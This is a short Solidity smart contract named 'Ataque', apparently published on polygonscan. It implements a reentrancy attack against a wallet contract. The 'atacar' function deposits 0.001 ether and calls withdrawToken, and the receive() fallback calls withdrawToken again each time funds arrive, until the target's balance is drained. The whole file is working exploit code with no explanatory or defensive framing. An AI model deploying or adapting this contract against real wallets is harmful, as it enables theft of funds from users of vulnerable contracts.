/**
 *Submitted for verification at polygonscan.com on 2022-11-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function DepositTransferred() external payable;
    function withdrawToken() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 0.001 ether, "Insuficiente eth");
        wallet.DepositTransferred{value: 0.001 ether}();
        wallet.withdrawToken();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 0.001 ether)
            wallet.withdrawToken();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}